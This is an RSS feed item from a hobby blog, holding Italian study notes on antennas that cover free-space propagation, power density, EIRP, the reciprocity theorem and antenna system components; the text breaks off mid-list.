<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Tutorial on HomePage</title>
    <link>https://kobra3390.github.io/SpaceHack/categories/tutorial/</link>
    <description>Recent content in Tutorial on HomePage</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="https://kobra3390.github.io/SpaceHack/categories/tutorial/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Appunti sulle Antenne</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/appunti-sulle-antenne/antenne/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/appunti-sulle-antenne/antenne/</guid>
      <description>Table of Contents  Appunti sulle Antenne Propagazione delle onde elettromagnetiche nello spazio libero  Intensitá del campo elettromagnetico prodotto da un’antenna isotropica  Cos’é la densitá di potenza Cos’é intesitá del campo elettrico   EIRP e calcolo del campo elettromagnetico prodotto da un’antenna non isotropica  Calcolo dell’EIRP Calcolo del campo elettromagnetico prodotto da un’antenna reale     Le Antenne  Teorema di Reciprocitá Componenti di un sistema di antenna   Diagramma di radiazione e solido di radiazione Guadagno di un’antenna  Guadagno rispetto all’antenna isotropica Guadagno rispetto all’antenna al dipolo in λ/2   Principali tipi di antenne  Principio di funzionamento delle antenne lineari Banda di un’antenna lineare Resistenza d’antenna  Resistenza di radiazione Resistenza di dissipazione   Parametri tipi di delle antenne riceventi  Altezza efficace Fattore di traduzione da campo elettrico indicente Area equivalente Correlazione tra Dimensioni dell’antenna e l’area equivalente Fattore di trasduzione da densitá di potenza incidente     Antenne omnidirezionali  Dipolo in λ/2 Antenna Marconi Antenna Ground Plane Antenne Caricate Dipolo ripiegato (folded dipole) e antenne a banda larga   Antenne direttive  Angolo di apertura del fascio (beamwidth) o angolo di radiazione Front-to-Back Ratio (rapporto avanti/dietro) Antenna Yagi Antenna collineari e a cortina Puntamento delle antenne direttive   Antenne a superficie  Antenna parabolica Parabola offset Antenne paraboliche per la ricezione TV da satellite Parabola Cassegrain   Sistemi di antenna MIMO(Multiple In Multiple Out) Installazione dei sistemi di antenna  Orizzonte radio e massima distanza fra due antenne Perdite per diffrazione e prima zona di Fresnel   Dimensionamento di un collegamento radio  Bilancio di potenza (link budget) di un collegamento radio Calcolo del livello in ricezione   Fading delle Antenne   In questo blog non vorrei parlare delle discipline come informatica, sicurezza informatica, ma col tempo vorrei trattare anche tematiche che riguardano il mio indirizzo di studi, ossia telecomunicazioni.</description>
      <content>&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#appunti-sulle-antenne&#34;&gt;Appunti sulle Antenne&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#propagazione-delle-onde-elettromagnetiche-nello-spazio-libero&#34;&gt;Propagazione delle onde elettromagnetiche nello spazio libero&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#intensit%C3%A1-del-campo-elettromagnetico-prodotto-da-un-antenna-isotropica&#34;&gt;Intensitá del campo elettromagnetico prodotto da un’antenna isotropica&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#cos-%C3%A9-la-densit%C3%A1-di-potenza&#34;&gt;Cos’é la densitá di potenza&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#cos-%C3%A9-intesit%C3%A1-del-campo-elettrico&#34;&gt;Cos’é intesitá del campo elettrico&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#eirp-e-calcolo-del-campo-elettromagnetico-prodotto-da-un-antenna-non-isotropica&#34;&gt;EIRP e calcolo del campo elettromagnetico prodotto da un’antenna non isotropica&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#calcolo-dell-eirp&#34;&gt;Calcolo dell’EIRP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#calcolo-del-campo-elettromagnetico-prodotto-da-un-antenna-reale&#34;&gt;Calcolo del campo elettromagnetico prodotto da un’antenna reale&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#le-antenne&#34;&gt;Le Antenne&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#teorema-di-reciprocit%C3%A1&#34;&gt;Teorema di Reciprocitá&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#componenti-di-un-sistema-di-antenna&#34;&gt;Componenti di un sistema di antenna&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#diagramma-di-radiazione-e-solido-di-radiazione&#34;&gt;Diagramma di radiazione e solido di radiazione&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#guadagno-di-un-antenna&#34;&gt;Guadagno di un’antenna&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#guadagno-rispetto-all-antenna-isotropica&#34;&gt;Guadagno rispetto all’antenna isotropica&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#guadagno-rispetto-all-antenna-al-dipolo-in-%CE%BB-2-&#34;&gt;Guadagno rispetto all’antenna al dipolo in &lt;strong&gt;λ/2&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#principali-tipi-di-antenne&#34;&gt;Principali tipi di antenne&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#principio-di-funzionamento-delle-antenne-lineari&#34;&gt;Principio di funzionamento delle antenne lineari&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#banda-di-un-antenna-lineare&#34;&gt;Banda di un’antenna lineare&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#resistenza-d-antenna&#34;&gt;Resistenza d’antenna&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#resistenza-di-radiazione&#34;&gt;Resistenza di radiazione&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#resistenza-di-dissipazione&#34;&gt;Resistenza di dissipazione&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#parametri-tipi-di-delle-antenne-riceventi&#34;&gt;Parametri tipi di delle antenne riceventi&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#altezza-efficace&#34;&gt;Altezza efficace&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#fattore-di-traduzione-da-campo-elettrico-indicente&#34;&gt;Fattore di traduzione da campo elettrico indicente&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#area-equivalente&#34;&gt;Area equivalente&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#correlazione-tra-dimensioni-dell-antenna-e-l-area-equivalente&#34;&gt;Correlazione tra Dimensioni dell’antenna e l’area equivalente&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#fattore-di-trasduzione-da-densit%C3%A1-di-potenza-incidente&#34;&gt;Fattore di trasduzione da densitá di potenza incidente&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenne-omnidirezionali&#34;&gt;Antenne omnidirezionali&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#dipolo-in-%CE%BB-2-&#34;&gt;Dipolo in &lt;strong&gt;λ/2&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenna-marconi&#34;&gt;Antenna Marconi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenna-ground-plane&#34;&gt;Antenna Ground Plane&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenne-caricate&#34;&gt;Antenne Caricate&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#dipolo-ripiegato-folded-dipole-e-antenne-a-banda-larga&#34;&gt;Dipolo ripiegato (folded dipole) e antenne a banda larga&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenne-direttive&#34;&gt;Antenne direttive&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#angolo-di-apertura-del-fascio-beamwidth-o-angolo-di-radiazione&#34;&gt;Angolo di apertura del fascio (beamwidth) o angolo di radiazione&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#front-to-back-ratio-rapporto-avanti-dietro-&#34;&gt;Front-to-Back Ratio (rapporto avanti/dietro)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenna-yagi&#34;&gt;Antenna Yagi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenna-collineari-e-a-cortina&#34;&gt;Antenna collineari e a cortina&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#puntamento-delle-antenne-direttive&#34;&gt;Puntamento delle antenne direttive&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenne-a-superficie&#34;&gt;Antenne a superficie&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#antenna-parabolica&#34;&gt;Antenna parabolica&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#parabola-offset&#34;&gt;Parabola offset&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#antenne-paraboliche-per-la-ricezione-tv-da-satellite&#34;&gt;Antenne paraboliche per la ricezione TV da satellite&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#parabola-cassegrain&#34;&gt;Parabola Cassegrain&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#sistemi-di-antenna-mimo-multiple-in-multiple-out-&#34;&gt;Sistemi di antenna MIMO(Multiple In Multiple Out)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#installazione-dei-sistemi-di-antenna&#34;&gt;Installazione dei sistemi di antenna&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#orizzonte-radio-e-massima-distanza-fra-due-antenne&#34;&gt;Orizzonte radio e massima distanza fra due antenne&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#perdite-per-diffrazione-e-prima-zona-di-fresnel&#34;&gt;Perdite per diffrazione e prima zona di Fresnel&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#dimensionamento-di-un-collegamento-radio&#34;&gt;Dimensionamento di un collegamento radio&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#bilancio-di-potenza-link-budget-di-un-collegamento-radio&#34;&gt;Bilancio di potenza (link budget) di un collegamento radio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#calcolo-del-livello-in-ricezione&#34;&gt;Calcolo del livello in ricezione&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#fading-delle-antenne&#34;&gt;Fading delle Antenne&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;In questo blog non vorrei parlare delle discipline come informatica, sicurezza informatica, ma col tempo vorrei trattare anche tematiche che riguardano il mio indirizzo di studi, ossia telecomunicazioni. Col tempo verranno mostrati e trattati argomenti di telecomunicazioni ed elettronica.&lt;/p&gt;
&lt;p&gt;Oggi parliamo delle antenne, qui di seguito sono riportati dei miei personali appunti, buona lettura.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;propagazione-delle-onde-elettromagnetiche-nello-spazio-libero&#34;&gt;Propagazione delle onde elettromagnetiche nello spazio libero&lt;/h1&gt;
&lt;p&gt;I parametri con cui si valuta l’entitá del campo elettromagnetico sono:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Densitá di potenza \(S\) , che si misura in \(w / m^2\)&lt;/li&gt;
&lt;li&gt;Intensitá del campo elettrico \(E\), che si misura in \(V / m\)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In particolare, si deve garantire che sull’antenna ricevente si abbia un valore di campo elettromagnetico tale da ottenere in ingresso al ricevitore un segnale che abbia un livello di potenza pari alla sensibilitá del ricevitore.&lt;/p&gt;
&lt;p&gt;La &lt;strong&gt;sensibilitá del ricevitore&lt;/strong&gt; (in inglese sensitivity) é definita come il minimo livello di potenza del segnale in ingresso al ricevitore che consente di fornire in uscita un segnale di qualitá accettabile.&lt;/p&gt;
&lt;p&gt;I valori del campo elettromagnetico dipendono da fattori come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Potenza del segnale fornito in ingresso all’antenna trasmittente&lt;/li&gt;
&lt;li&gt;Tipo di antenna trasmittente&lt;/li&gt;
&lt;li&gt;Distanza fra antenna trasmittente e ricevente&lt;/li&gt;
&lt;li&gt;Ambiente in cui avviene la propagazione delle onde elettromagnetiche&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Altri due concetti importanti per lo studio dell’entitá del campo elettromagnetico sono: &lt;em&gt;l’antenna isotropic&lt;/em&gt;a e &lt;em&gt;lo spazio libero&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Un’antenna isotropica&lt;/strong&gt; ideale é un antenna che irradia uniformemente in tutte le direzioni dello spazio e non causa dissipazione, dunque: \(P_{IRR} = P_{IN}\).&lt;/p&gt;
&lt;p&gt;Lo &lt;strong&gt;spazio libero&lt;/strong&gt; é una regione dello spazio assimilabile al vuoto, questo spazio é un mezzo isotropo in cui le onde elettromagnetiche viaggiano in linea retta alla velocitá della luce, ossia a:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
c \approx 3 * 10^8 \space \dfrac{m}{s}
$$&lt;/p&gt;
&lt;p&gt;Nello spazio libero l’intensitá del campo elettrico \(E\), l’intensitá del campo magnetico \(H\) e la densitá di potenza \(S\) possono essere considerati come tensione, corrente e potenza di un circuito elettrico.&lt;/p&gt;
&lt;p&gt;Ecco una tabella che chiarisce le associazioni dei valori nello spazio libero e in un circuito elettrico:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Valori nello Spazio Libero&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Valori in un Circuito Elettrico&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intensitá del campo elettrico E&lt;/td&gt;
&lt;td&gt;=&lt;/td&gt;
&lt;td&gt;Tensione V&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Intesitá del campo magnetico H&lt;/td&gt;
&lt;td&gt;=&lt;/td&gt;
&lt;td&gt;Corrente I&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Densitá di potenza S&lt;/td&gt;
&lt;td&gt;=&lt;/td&gt;
&lt;td&gt;Potenza P&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Inoltre lo spazio libero é considerabile come un mezzo trasmissivo avente impedenza caratteristica:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
Z_0 = 120 \pi \space \approx \space 377Ω
$$&lt;/p&gt;
&lt;p&gt;É possibile estendere le leggi fondamentali dell’elettrotecnica per determinare i legami fra \(E\), \(H\), \(S\). Avendo fatto in precedenza quelle associazioni tra i valori del campo elettromagnetico e grandezze elettriche possiamo definire le seguenti relazioni:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
E = Z_0 * H; \space\space
S = E * H; \space\space
Z_0 = \dfrac{E}{H};
$$&lt;/p&gt;
&lt;p&gt;Da questi si possono definire i seguenti legami tra &lt;strong&gt;campo elettrico&lt;/strong&gt; \(E\) e &lt;strong&gt;densitá di potenza&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
S = \dfrac{E^2}{Z_0} \implies S = \dfrac{E^2}{120 * \pi}  [ \space W / m^2 \space]
E = \sqrt{S * Z_0} \implies E = \sqrt{S * 120 * \pi} \space\space [\space V / m \space]
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;intensitá-del-campo-elettromagnetico-prodotto-da-unantenna-isotropica&#34;&gt;Intensitá del campo elettromagnetico prodotto da un’antenna isotropica&lt;/h2&gt;
&lt;p&gt;Lo studio della determinazione del campo elettromagnetico nel caso di un antenna isotropica posta nello spazio libero é di particolare importanza in quanto le formule ricavate possono essere riutilizzate per una valutazione del campo elettromagnetico in un ambiente reale.&lt;/p&gt;
&lt;p&gt;Pensiamo dunque al caso ideale di un’antenna trasmittente isotropica posta nello spazio libero. All’antenna viene fornita in ingresso una certa potenza di segnale \(P_{IN}\), che viene totalmente irradiata in modo uniforme in tutte le direzioni, si ha dunque \(P_{IN_ISO} = P_{IRR_ISO}\).&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;cosé-la-densitá-di-potenza&#34;&gt;Cos’é la densitá di potenza&lt;/h3&gt;
&lt;p&gt;Un generatore a radiofrequenza connesso a un’antenna isotropica, posta nello spazio libero, genererebbe onde elettromagnetiche i cui fronti d’onda sono costituiti da superfici sferiche, in quanto l’irradiazione é uniforme in tutte le direzioni e non si hanno né ostacoli né eterogeneitá.&lt;/p&gt;
&lt;p&gt;La &lt;strong&gt;densitá di potenza&lt;/strong&gt; é data dalla potenza per unitá di area:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
S = \dfrac{P_{IRR_ISO}}{4\pi * r^2} \space\space [\space \dfrac{W}{m^2} \space]
$$&lt;/p&gt;
&lt;p&gt;dove:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\(S \space(W / m^2):\) densitá di potenza a distanza $r$ dall’antenna isotropica ideale;&lt;/li&gt;
&lt;li&gt;\(P_{IRR_ISO} \space (W):\) potenza irradiata in modo isotropico, pari alla potenza di ingresso nel caso di antenna isotropica ideale;&lt;/li&gt;
&lt;li&gt;\(r(m):\)  distanza fra l’antenna isotropica e il punto in cui si valuta la densitá di potenza&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;cosé-intesitá-del-campo-elettrico&#34;&gt;Cos’é intesitá del campo elettrico&lt;/h3&gt;
&lt;p&gt;Il valore efficace dell’intensitá del campo elettrico \(E\), si puó calcolare con la relazione:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
E = \dfrac{1}{r} \space \sqrt{30 * P_{IRR_ISO_[w]}} \space [\space V/m\space]
$$&lt;/p&gt;
&lt;p&gt;Ecco un’immagine del campo elettromagnetico generato da un’antenna isotropica:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna1.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h2 id=&#34;eirp-e-calcolo-del-campo-elettromagnetico-prodotto-da-unantenna-non-isotropica&#34;&gt;EIRP e calcolo del campo elettromagnetico prodotto da un’antenna non isotropica&lt;/h2&gt;
&lt;p&gt;L’EIRP (Effective Isotropic Radiated Power) é definito come il livello di potenza, espresso in dBW o dBm fornito in ingresso a un’antenna isotropica per fornire lo stesso campo elettromagnetico prodotto dall’antenna reale:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
EIRP = 10 \log_{10}(P_{IN_ISO}) = 10 \log_{10}(P_{IRR_ISO})
$$&lt;/p&gt;
&lt;p&gt;In altre parole dunque, l’EIRP descrivere la potenza totale irradiata da un&amp;rsquo;antenna in una determinata direzione, rispetto alla potenza che sarebbe irradiata se l&amp;rsquo;antenna fosse una sorgente isotropica ideale che irradia uniformemente in tutte le direzioni.&lt;/p&gt;
&lt;p&gt;L&amp;rsquo;EIRP tiene conto della potenza di trasmissione dell&amp;rsquo;antenna e della direzionalità del diagramma di radiazione dell&amp;rsquo;antenna stessa e tiene conto del fatto che un&amp;rsquo;antenna non irradia uniformemente in tutte le direzioni ma concentra la potenza in determinate direzioni. Infine l’EIRP viene utilizzata per  rappresentare una misura della capacità dell&amp;rsquo;antenna di trasmettere segnali a lunghe distanze.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;calcolo-delleirp&#34;&gt;Calcolo dell’EIRP&lt;/h3&gt;
&lt;p&gt;In precedenza abbiamo visto la formula generica per il calcolo dell’EIRP, ma esiste anche un’altra circostanza nella quale va calcolato. Si consideri lo schema di un sistema di trasmissione radio reale che comprenda:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un trasmettitore con un segnale che ha una certa potenza \(P_{TX} (W)\)  e un livello di potenza \(L_{PTX} = 10\log(P_{TX_[W]})\) dBW.&lt;/li&gt;
&lt;li&gt;Un cavo che collega il trasmettitore all’antenna con un’attenuazione \(A_F(dB)\)&lt;/li&gt;
&lt;li&gt;Un’antenna trasmittente con un guadagno \(G_{ant} (dB)\)&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna2.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;L’EIRP viene calcolato utilizzando i decibel:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
EIRP = L_{PTX_[dBW]} \space-\space A_{F_[dB]} \space+\space G_{ant_[dB]} \space[dBW]
$$&lt;/p&gt;
&lt;p&gt;Noto l’EIRP é possibile calcolare la potenza equivalente che dovrebbe irradiare un’antenna isotropica per produrre lo stesso campo elettromagnetico che produce l’antenna reale:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
P_{IRR_ISO} = 10^{EIRP/10} \space [W]
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;calcolo-del-campo-elettromagnetico-prodotto-da-unantenna-reale&#34;&gt;Calcolo del campo elettromagnetico prodotto da un’antenna reale&lt;/h3&gt;
&lt;p&gt;Nel caso di antenna reale i valori di densitá di potenza (\(S\) e di campo elettrico (\(E\) possono essere calcolati con il seguente procedimento:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Si calcola l’EIRP.&lt;/li&gt;
&lt;li&gt;Si calcola la potenza equivalente irradiata isotropicamente.&lt;/li&gt;
&lt;li&gt;Si calcolano i valori di \(S\) ed \(E\) con la formula:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\Large\textsf{}
S = \dfrac{P_{IRR_ISO}}{4\pi * r^2} \space[W/m^2]; \space\space E = \dfrac{1}{r} * \sqrt{30 * {P_{IRR_ISO}}}\space[W/m];
$$&lt;/p&gt;
&lt;p&gt;Il calcolo del campo elettromagnetico in un sistema trasmittente via radio viene effettuato per due motivi:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Verificare che la sua intensitá sia tale da fornite al ricevitore un segnale avente un livello di potenza sufficiente&lt;/li&gt;
&lt;li&gt;Verificare che il campo elettrico \(E\) misurato e la densitá di potenza \(S\) non debbano superare i seguenti valori:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;$$
\Large\textsf{}
E_{MAX} \leq 6 \space V/m, \space\space per \space\space 100kHz \leq f \leq 300 GHz \newline
S_{MAX} \leq 0,1 \space W/m^2, \space\space per \space\space 3MHz \leq f \leq 300 GHz
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;le-antenne&#34;&gt;Le Antenne&lt;/h1&gt;
&lt;p&gt;L’antenna é l’ultimo elemento di un sistema di trasmissione via radio. Essa riceve un segnale da un trasmettitore il quale imprime su un segnale a radiofrequenza (RF) le informazioni da trasmettere via radio.&lt;/p&gt;
&lt;p&gt;L’uscira dell’amplificatore di potenza é un segnale in corrente avente frequenza adatta alla trasmissione via radio e potenza sufficiente a garantire una corretta ricezione.&lt;/p&gt;
&lt;p&gt;Dunque possiamo dire che: &lt;em&gt;Un’antenna é definita come un trasduttore che in trasmissione converte un segnale elettrico a radiofrequenza in onde elettromagnetiche irradiate nelle direzioni desiderate, mentre in ricezione converte in modo efficiente le onde elettromagneitche in un segnale elettrico a RF&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Possiamo avere molti tipi di trasmissione radio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Radiodiffusione AM ed FM&lt;/li&gt;
&lt;li&gt;TV&lt;/li&gt;
&lt;li&gt;Ponti Radio&lt;/li&gt;
&lt;li&gt;Sistemi cellulari&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;e i requisiti richiesti per le antenne possono essere diversi. Per esempio la radiodiffusione l’antenna trasmittente é omnidirezionale sul piano orizzontale per poter raggiungere tutti gli utenti, mentre per un collegamento in ponte radio si richiede che l’antenna sia estremamente direttiva cosí da limitare la potenza necessaria per trasmettere.&lt;/p&gt;
&lt;p&gt;Per le antenne vale il &lt;strong&gt;principio di reciprocitá&lt;/strong&gt; che afferma: &lt;em&gt;le proprietá di un’antenna rimangono le stesse sia che essa venga usata come antenna trasmittente sia che ricevente&lt;/em&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;teorema-di-reciprocitá&#34;&gt;Teorema di Reciprocitá&lt;/h3&gt;
&lt;p&gt;Il teorema di reciprocità nelle antenne di telecomunicazione è un principio fondamentale che riguarda la simmetria e l&amp;rsquo;omogeneità del mezzo di propagazione delle onde elettromagnetiche. In parole semplici, questo teorema afferma che le caratteristiche di trasmissione e di ricezione di un&amp;rsquo;antenna sono identiche quando viene utilizzata come trasmettitore e come ricevitore.&lt;/p&gt;
&lt;p&gt;In altre parole, se un&amp;rsquo;antenna trasmette un segnale in una determinata direzione e successivamente viene utilizzata per ricevere un segnale nella stessa direzione, le sue proprietà di ricezione saranno le stesse che se fosse stata progettata specificamente per ricevere il segnale in questione. Questo significa che le antenne possono essere utilizzate per la trasmissione e la ricezione di segnali senza necessità di modifiche significative alla loro struttura o alla loro geometria.&lt;/p&gt;
&lt;p&gt;Il teorema di reciprocità si applica a tutte le antenne che soddisfano determinate condizioni di simmetria e linearità. In particolare, si applica alle antenne a filo, alle antenne a dipolo, alle antenne a cornetta, alle antenne a riflettore parabolico e alle antenne a schiera. In genere, tutte le antenne che presentano un&amp;rsquo;impedenza di radiazione costante e omogenea in tutte le direzioni sono compatibili con il teorema di reciprocità.&lt;/p&gt;
&lt;p&gt;L&amp;rsquo;importanza del teorema di reciprocità sta nella sua applicazione pratica. Ad esempio, quando si progetta un sistema di telecomunicazioni, spesso si utilizzano antenne diverse per la trasmissione e la ricezione dei segnali. Tuttavia, grazie al teorema di reciprocità, è possibile utilizzare la stessa antenna sia per trasmettere che per ricevere il segnale, semplificando notevolmente il progetto del sistema e riducendo i costi.&lt;/p&gt;
&lt;p&gt;Inoltre, il teorema di reciprocità può essere utilizzato per calcolare l&amp;rsquo;efficienza di una antenna quando viene utilizzata come ricevitore, poiché l&amp;rsquo;efficienza di trasmissione e di ricezione sono uguali. Questo può essere utile per determinare la capacità di una antenna di ricevere un segnale in presenza di rumore o interferenze.&lt;/p&gt;
&lt;p&gt;In sintesi, il teorema di reciprocità è un principio fondamentale delle antenne di telecomunicazione che permette di semplificare il progetto dei sistemi di comunicazione e di calcolare l&amp;rsquo;efficienza delle antenne quando vengono utilizzate come ricevitori.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;componenti-di-un-sistema-di-antenna&#34;&gt;Componenti di un sistema di antenna&lt;/h2&gt;
&lt;p&gt;Un impianto di trasmissione e/o ricezione via radio comprende un sistema di antenna, il quale puó essere costituito dai seguenti elementi:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Antenna&lt;/strong&gt;&lt;/em&gt;: é l’elemento irradiante o ricevente, puó essere montata su una torre (che prende il nome di traliccio o palo) al fine di garantire la copertura radio alla distanza massima prevista per il sistema di comunicazione via radio.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Linea di trasmissione (feeder d’antenna)&lt;/strong&gt;&lt;/em&gt;: é utilizzata per collegare il trasmettitore (o il ricevitore) con l’antenna. Ha lo scopo di trasferire il segnale dal trasmettitore all’antenna con la minima attenuazione possibile.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Dispositivo di adattamento&lt;/strong&gt;&lt;/em&gt;: consente di riprisitnare l’adattamento fra linea e antenna nel caso in cui l’impedenza dell’antenna non si auguale all’impedenza caratteristica della linea.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Dispositivo di separazione TX-RX (duplexer o circolatore)&lt;/strong&gt;&lt;/em&gt;: é utilizzato per separare i sensi di trasmissione (TX) e ricezione (RX) nel caso in cui si utilizzi la stessa antenna sia per trasmettere sia per ricevere.&lt;/li&gt;
